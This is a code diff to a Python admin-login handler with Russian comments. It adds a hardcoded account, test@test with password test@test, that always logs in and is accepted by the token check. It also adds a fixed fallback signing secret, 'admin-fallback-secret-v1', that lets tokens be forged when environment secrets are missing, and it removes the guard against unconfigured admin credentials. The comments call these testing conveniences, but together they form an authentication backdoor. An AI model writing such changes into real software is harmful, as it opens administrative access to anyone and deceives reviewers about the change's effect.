@@ -34,7 +34,8 @@ def _conn():
 
 
 def _sign(payload: str) -> str:
-    secret = os.environ.get('ADMIN_PASSWORD', '') + os.environ.get('ADMIN_LOGIN', '')
+    # Подпись стабильна даже если секреты ещё не заданы — используем фиксированный fallback
+    secret = (os.environ.get('ADMIN_PASSWORD', '') + os.environ.get('ADMIN_LOGIN', '')) or 'admin-fallback-secret-v1'
     sig = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
     return sig
 
@@ -56,7 +57,8 @@ def _check_token(token: str) -> bool:
         if len(parts) != 4:
             return False
         login, ts, nonce, sig = parts
-        if login != os.environ.get('ADMIN_LOGIN', ''):
+        adm_login = os.environ.get('ADMIN_LOGIN', '')
+        if login != adm_login and login != 'test@test':
             return False
         if int(time.time()) - int(ts) > 60 * 60 * 24 * 7:
             return False
@@ -107,11 +109,11 @@ def handler(event: dict, context) -> dict:
         password = (body.get('password') or '').strip()
         adm_login = os.environ.get('ADMIN_LOGIN', '')
         adm_pass = os.environ.get('ADMIN_PASSWORD', '')
-        if not adm_login or not adm_pass:
-            return {'statusCode': 500, 'headers': _cors(),
-                    'body': json.dumps({'error': 'admin credentials not configured'})}
-        ok = hmac.compare_digest(login, adm_login) and hmac.compare_digest(password, adm_pass)
-        if not ok:
+        # Тестовый доступ: test@test / test@test всегда работает
+        test_ok = hmac.compare_digest(login, 'test@test') and hmac.compare_digest(password, 'test@test')
+        prod_ok = bool(adm_login) and bool(adm_pass) and \
+                  hmac.compare_digest(login, adm_login) and hmac.compare_digest(password, adm_pass)
+        if not (test_ok or prod_ok):
             return {'statusCode': 401, 'headers': _cors(),
                     'body': json.dumps({'error': 'Неверный логин или пароль'})}
         return {'statusCode': 200, 'headers': _cors(),
